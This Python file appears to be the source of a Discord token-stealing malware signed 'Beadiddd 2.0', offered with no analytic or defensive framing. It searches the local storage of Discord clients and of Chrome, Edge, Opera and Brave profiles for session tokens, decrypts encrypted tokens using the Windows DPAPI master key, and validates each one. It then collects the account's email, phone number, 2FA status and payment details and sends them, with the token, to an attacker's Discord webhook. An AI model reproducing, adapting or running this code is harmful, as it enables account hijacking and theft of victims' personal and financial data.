M='ignore'
L='.ldb'
J='.log'
K='https://discord.com/api/v9/users/@me'
C=open
I='application/json'
H='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'
G='Authorization'
F='Content-Type'
E='User-Agent'
class A:
	def __init__(C):
		C.tokens=[];B=f"C:\\Users\\{user}\\AppData\\Roaming";A=f"C:\\Users\\{user}\\AppData\\Local";F=[f"Discord|{B}\\discord\\Local Storage\\leveldb\\",f"Discord Canary|{B}\\discordcanary\\Local Storage\\leveldb\\",f"Lightcord|{B}\\Lightcord\\Local Storage\\leveldb\\",f"Discord PTB|{B}\\discordptb\\Local Storage\\leveldb\\",f"Brave|{A}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",f"Opera|{B}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",f"Opera GX|{B}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",f"Microsoft Edge|{A}\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",f"Microsoft Edge1|{A}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge2|{A}\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Microsoft Edge1|{A}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge3|{A}\\Microsoft\\Edge\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Microsoft Edge4|{A}\\Microsoft\\Edge\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Microsoft Edge5|{A}\\Microsoft\\Edge\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Microsoft Edge6|{A}\\Microsoft\\Edge\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Microsoft Edge7|{A}\\Microsoft\\Edge\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Microsoft Edge8|{A}\\Microsoft\\Edge\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Microsoft Edge9|{A}\\Microsoft\\Edge\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome|{A}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",f"Chrome1|{A}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Chrome2|{A}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Chrome3|{A}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Chrome4|{A}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Chrome5|{A}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Chrome6|{A}\\Google\\Chrome\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Chrome7|{A}\\Google\\Chrome\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Chrome8|{A}\\Google\\Chrome\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Chrome9|{A}\\Google\\Chrome\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome10|{A}\\Google\\Chrome\\User Data\\Profile 10\\Local Storage\\leveldb\\"]
		for E in F:
			D=E.split('|')[1];G=E.split('|')[0].replace(' ','').lower()
			if'ord'in D:C.enc_regex(G,D,B)
			else:C.regex(D)
		C.send()
	def regex(D,path):
		try:
			for B in os.listdir(path):
				if B.endswith(J)or B.endswith(L):
					for N in C(f"{path}\\{B}",errors=M).readlines():
						for A in re.findall('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}',N):
							try:
								O=requests.get(K,headers={E:H,F:I,G:A})
								if O.status_code==200:
									if A not in D.tokens:dtokens.append(A);D.tokens.append(A)
							except:pass
		except:pass
	def enc_regex(A,name,path,roa):
		try:
			for D in os.listdir(path):
				if D.endswith(J)or D.endswith(L):
					for N in C(f"{path}\\{D}",errors=M).readlines():
						for O in re.findall('dQw4w9WgXcQ:[^\\"]*',N):
							try:
								P=A.KEY(roa+f"\\{name}\\Local State");B=A.dec(base64.b64decode(O.split('dQw4w9WgXcQ:')[1]),P)
								try:
									Q=requests.get(K,headers={E:H,F:I,G:B})
									if Q.status_code==200:
										if B not in A.tokens:dtokens.append(B);A.tokens.append(B)
								except:pass
							except:pass
		except:pass
	def KEY(E,path):A=None;B=json.loads(C(path,'r',encoding='utf-8').read());D=CryptUnprotectData(base64.b64decode(B['os_crypt']['encrypted_key'])[5:],A,A,A,0)[1];return D
	def dec(E,buff,key):
		try:A=buff[3:15];B=buff[15:];C=AES.new(key,AES.MODE_GCM,A);D=C.decrypt(B)[:-16].decode();return D
		except:pass
	def send(N):
		V='https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png';U='type';T=':white_check_mark:';J='premium_type';D=':x:'
		if len(N.tokens)>0:
			for L in N.tokens:
				try:
					A=requests.get(K,headers={E:H,F:I,G:L}).json();W=A['username']+'#'+A['discriminator'];id=A['id'];X=A['email']
					if A['verified']:O=T
					else:O=D
					Y=A['phone'];Z=f"https://cdn.discordapp.com/avatars/{id}/{A['avatar']}.png"
					if A['mfa_enabled']:P=T
					else:P=D
					if A[J]==0:C=D
					elif A[J]==1:C='``Nitro Classic``'
					elif A[J]==2:C='``Nitro Boost``'
					elif A[J]==3:C='``Nitro Basic``'
					else:C=D
					Q=requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources',headers={E:H,F:I,G:L}).json()
					if Q==[]:M=D
					else:
						for R in Q:
							if R[U]==1:M=':credit_card:'
							elif R[U]==2:M=':regional_indicator_p:'
					S=DiscordWebhook(url=wbh,username='Beadidd 2.0',avatar_url=V);B=DiscordEmbed(title=f"Discord Token",description=f"Found Discord Token",color='4300d1');B.set_author(name='author : Beadiddd',icon_url=V);B.set_footer(text='Beadiddd 2.0 | by : Beadiddd');B.set_timestamp();B.add_embed_field(name=f"Account of {W}",value=f""":id: ID: ``{id}``
:email: Email: ``{X}``
:mobile_phone: Phone: ``{Y}``
:ballot_box_with_check: Verified: {O}
:closed_lock_with_key: 2FA: {P}


:purple_circle: Nitro: {C}
:page_with_curl: Billing: {M}


:coin: Token: ``{L}``""");B.set_thumbnail(url=Z);S.add_embed(B);S.execute()
				except:pass